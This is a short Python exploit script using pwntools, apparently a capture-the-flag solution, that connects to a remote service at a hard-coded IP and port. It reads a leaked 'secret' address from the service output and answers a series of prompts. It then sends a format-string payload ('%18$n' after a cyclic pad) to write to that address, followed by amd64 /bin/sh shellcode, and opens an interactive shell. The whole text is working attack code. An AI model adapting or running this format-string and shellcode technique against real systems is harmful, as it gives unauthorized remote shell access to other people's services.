from pwn import *
import re
context.arch = 'amd64'

if __name__ == '__main__':
    io = remote('111.200.241.244', 57274)
    # io = process('./pwn')
    io.recv()
    start = io.recv()
    print(start)
    addr = re.findall('secret\[1] is [0-9a-fA-F]{0,16}', str(start))[0][13:]
    io.send(b'deadbeef\n')
    io.recv()
    io.send(b'east\n')
    io.recv()
    io.send(b'1\n')
    io.recv()
    io.send(b'0\n')
    shellcode = asm(shellcraft.amd64.sh())
    payload = cyclic(68) + b'%18$nAAAAAAA' + p64(int(addr, 16)) + b'\n'
    io.recv()
    io.send(payload)
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.send(shellcode)
    io.interactive()